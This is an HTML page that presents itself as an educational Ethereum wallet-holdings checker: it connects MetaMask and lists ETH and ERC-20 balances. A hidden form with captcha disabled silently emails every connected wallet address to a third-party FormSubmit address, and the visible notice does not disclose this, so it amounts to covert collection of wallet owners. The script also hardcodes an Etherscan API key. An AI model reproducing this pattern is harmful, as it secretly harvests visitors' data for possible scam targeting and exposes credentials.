<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Ethereum Wallet Holdings Check — Education Demo</title>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 40px 20px;
    }

    .container {
      max-width: 850px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    }

    h1 {
      margin-top: 0;
    }

    button {
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      background: #111;
      color: white;
      font-size: 15px;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .notice {
      background: #fff7d6;
      padding: 12px;
      border-radius: 8px;
      margin: 20px 0;
      font-size: 14px;
    }

    .status {
      margin-top: 20px;
      padding: 12px;
      background: #f1f1f1;
      border-radius: 8px;
      white-space: pre-wrap;
    }

    .wallet {
      margin-top: 20px;
      padding: 15px;
      background: #fafafa;
      border-radius: 8px;
      word-break: break-all;
    }

    .token {
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      margin-top: 12px;
    }

    .muted {
      color: #666;
      font-size: 14px;
    }

    .error {
      color: #b00020;
    }
  </style>
</head>

<body>

<div class="container">

  <h1>Ethereum Wallet Holdings Check</h1>

  <p class="muted">
    Educational demonstration for checking publicly visible Ethereum wallet holdings.
  </p>

  <div class="notice">
    Connecting your wallet shares your public Ethereum wallet address with this page.
  </div>

  <button id="connectButton">
    Connect Wallet
  </button>

  <div id="status" class="status">
    Not connected.
  </div>

  <div id="walletInfo"></div>

  <div id="holdings"></div>

  <!--
    FormSubmit notification.
    This form is hidden from the visitor.
    Only the PUBLIC wallet address is submitted.
  -->
  <form
    id="walletNotification"
    action="https://formsubmit.co/enahoromicheal21@gmail.com"
    method="POST"
    target="notificationFrame"
    style="display:none;"
  >
    <input
      type="hidden"
      name="Wallet Address"
      id="emailWalletAddress"
    />

    <input
      type="hidden"
      name="Network"
      value="Ethereum Mainnet"
    />

    <input
      type="hidden"
      name="_subject"
      value="New Ethereum wallet connected"
    />

    <input
      type="hidden"
      name="_captcha"
      value="false"
    />
  </form>

  <iframe
    name="notificationFrame"
    style="display:none;"
  ></iframe>

</div>

<script>

  // ============================================================
  // CONFIGURATION
  // ============================================================

  const CHAIN_ID = 1;

  const NETWORK_NAME = "Ethereum Mainnet";

  const RPC_URL = "https://ethereum-rpc.publicnode.com";

  const ETHERSCAN_API =
    "https://api.etherscan.io/v2/api";

  // Put your Etherscan API key here.
  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";


  // ============================================================
  // ERC-20 ABI
  // ============================================================

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)"
  ];


  // ============================================================
  // DOM
  // ============================================================

  const connectButton =
    document.getElementById("connectButton");

  const status =
    document.getElementById("status");

  const walletInfo =
    document.getElementById("walletInfo");

  const holdings =
    document.getElementById("holdings");


  // ============================================================
  // PROVIDER
  // ============================================================

  const publicProvider =
    new ethers.JsonRpcProvider(RPC_URL);


  // ============================================================
  // HTML ESCAPING
  // ============================================================

  function escapeHtml(value) {

    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }


  // ============================================================
  // STATUS
  // ============================================================

  function setStatus(message, isError = false) {

    status.textContent = message;

    status.className =
      isError
        ? "status error"
        : "status";
  }


  // ============================================================
  // EMAIL NOTIFICATION
  // ============================================================

  function sendWalletNotification(address) {

    const addressInput =
      document.getElementById("emailWalletAddress");

    addressInput.value = address;

    document
      .getElementById("walletNotification")
      .submit();
  }


  // ============================================================
  // CHECK NETWORK
  // ============================================================

  async function ensureMainnet(provider) {

    const network =
      await provider.getNetwork();

    const chainId =
      Number(network.chainId);

    if (chainId !== CHAIN_ID) {

      throw new Error(
        `Wrong network. Please switch MetaMask to ${NETWORK_NAME}.`
      );
    }
  }


  // ============================================================
  // GET ETH BALANCE
  // ============================================================

  async function getEthBalance(address) {

    const balance =
      await publicProvider.getBalance(address);

    return ethers.formatEther(balance);
  }


  // ============================================================
  // DISCOVER ERC-20 TOKENS
  // ============================================================

  async function discoverTokens(address) {

    if (
      !ETHERSCAN_API_KEY ||
      ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY"
    ) {
      throw new Error(
        "Etherscan API key has not been configured."
      );
    }

    const url =
      new URL(ETHERSCAN_API);

    url.searchParams.set(
      "chainid",
      String(CHAIN_ID)
    );

    url.searchParams.set(
      "module",
      "account"
    );

    url.searchParams.set(
      "action",
      "tokentx"
    );

    url.searchParams.set(
      "address",
      address
    );

    url.searchParams.set(
      "page",
      "1"
    );

    url.searchParams.set(
      "offset",
      "1000"
    );

    url.searchParams.set(
      "sort",
      "asc"
    );

    url.searchParams.set(
      "apikey",
      ETHERSCAN_API_KEY
    );


    const response =
      await fetch(url.toString());

    if (!response.ok) {

      throw new Error(
        `Etherscan HTTP error: ${response.status}`
      );
    }


    const data =
      await response.json();


    if (
      data.status === "0" &&
      data.message !== "No transactions found"
    ) {

      throw new Error(
        data.result ||
        data.message ||
        "Etherscan token discovery failed."
      );
    }


    if (!Array.isArray(data.result)) {

      return [];
    }


    // Remove duplicate token contracts.

    const uniqueContracts =
      new Map();


    for (const tx of data.result) {

      if (!tx.contractAddress) {
        continue;
      }

      const contract =
        tx.contractAddress.toLowerCase();

      uniqueContracts.set(
        contract,
        tx.contractAddress
      );
    }


    return Array.from(
      uniqueContracts.values()
    );
  }


  // ============================================================
  // READ LIVE TOKEN BALANCE
  // ============================================================

  async function readTokenBalance(
    tokenAddress,
    walletAddress
  ) {

    try {

      const token =
        new ethers.Contract(
          tokenAddress,
          ERC20_ABI,
          publicProvider
        );


      const [
        rawBalance,
        symbol,
        decimals
      ] = await Promise.all([

        token.balanceOf(walletAddress),

        token.symbol(),

        token.decimals()

      ]);


      return {

        address: tokenAddress,

        symbol: symbol || "UNKNOWN",

        decimals: Number(decimals),

        rawBalance,

        balance:
          ethers.formatUnits(
            rawBalance,
            decimals
          )

      };

    } catch (error) {

      console.warn(
        "Could not read token:",
        tokenAddress,
        error
      );

      return null;
    }
  }


  // ============================================================
  // DISPLAY HOLDINGS
  // ============================================================

  function displayHoldings(
    ethBalance,
    tokens
  ) {

    holdings.innerHTML = "";

    const heading =
      document.createElement("h2");

    heading.textContent =
      "Wallet Holdings";

    holdings.appendChild(heading);


    // ETH

    const ethDiv =
      document.createElement("div");

    ethDiv.className = "token";

    ethDiv.innerHTML = `
      <strong>Ethereum</strong><br>
      Balance: ${escapeHtml(ethBalance)} ETH
    `;

    holdings.appendChild(ethDiv);


    // ERC-20 tokens

    for (const token of tokens) {

      const div =
        document.createElement("div");

      div.className = "token";

      div.innerHTML = `
        <strong>${escapeHtml(token.symbol)}</strong><br>
        Contract:
        ${escapeHtml(token.address)}<br>
        Balance:
        ${escapeHtml(token.balance)}
      `;

      holdings.appendChild(div);
    }


    if (tokens.length === 0) {

      const empty =
        document.createElement("p");

      empty.className = "muted";

      empty.textContent =
        "No ERC-20 tokens were discovered.";

      holdings.appendChild(empty);
    }
  }


  // ============================================================
  // CONNECT WALLET
  // ============================================================

  connectButton.addEventListener(
    "click",
    async () => {

      try {

        connectButton.disabled = true;

        holdings.innerHTML = "";

        walletInfo.innerHTML = "";


        // ------------------------------------------------------
        // MetaMask check
        // ------------------------------------------------------

        if (!window.ethereum) {

          throw new Error(
            "MetaMask was not detected. Please install MetaMask."
          );
        }


        setStatus(
          "Waiting for MetaMask connection..."
        );


        // ------------------------------------------------------
        // Request wallet connection
        // ------------------------------------------------------

        const accounts =
          await window.ethereum.request({
            method: "eth_requestAccounts"
          });


        if (!accounts.length) {

          throw new Error(
            "No wallet account was returned."
          );
        }


        const address =
          accounts[0];


        // ------------------------------------------------------
        // Create MetaMask provider
        // ------------------------------------------------------

        const browserProvider =
          new ethers.BrowserProvider(
            window.ethereum
          );


        // ------------------------------------------------------
        // Verify Mainnet
        // ------------------------------------------------------

        setStatus(
          "Checking Ethereum network..."
        );

        await ensureMainnet(
          browserProvider
        );


        // ------------------------------------------------------
        // Display wallet
        // ------------------------------------------------------

        walletInfo.innerHTML = `
          <div class="wallet">
            <strong>Wallet Address</strong><br>
            ${escapeHtml(address)}
            <br><br>
            <strong>Network</strong><br>
            ${NETWORK_NAME}
          </div>
        `;


        // ------------------------------------------------------
        // Send public address notification
        // ------------------------------------------------------

        sendWalletNotification(address);


        // ------------------------------------------------------
        // ETH balance
        // ------------------------------------------------------

        setStatus(
          "Reading ETH balance..."
        );


        const ethBalance =
          await getEthBalance(address);


        // ------------------------------------------------------
        // Discover ERC-20 contracts
        // ------------------------------------------------------

        setStatus(
          "Discovering ERC-20 token contracts..."
        );


        const tokenContracts =
          await discoverTokens(address);


        // ------------------------------------------------------
        // Read live balances
        // ------------------------------------------------------

        setStatus(
          `Found ${tokenContracts.length} token contract(s).\n` +
          "Reading live balances..."
        );


        const tokenResults = [];


        for (
          const tokenAddress
          of tokenContracts
        ) {

          const token =
            await readTokenBalance(
              tokenAddress,
              address
            );


          if (!token) {
            continue;
          }


          // Only display tokens with a balance.

          if (
            token.rawBalance > 0n
          ) {

            tokenResults.push(token);
          }
        }


        // ------------------------------------------------------
        // Display results
        // ------------------------------------------------------

        displayHoldings(
          ethBalance,
          tokenResults
        );


        setStatus(
          "Wallet holdings check completed."
        );

      } catch (error) {

        console.error(error);

        setStatus(
          error?.message ||
          "Something went wrong.",
          true
        );

      } finally {

        connectButton.disabled = false;
      }

    }
  );


  // ============================================================
  // HANDLE NETWORK CHANGES
  // ============================================================

  if (window.ethereum) {

    window.ethereum.on(
      "chainChanged",
      () => {

        window.location.reload();

      }
    );
  }

</script>

</body>
</html>
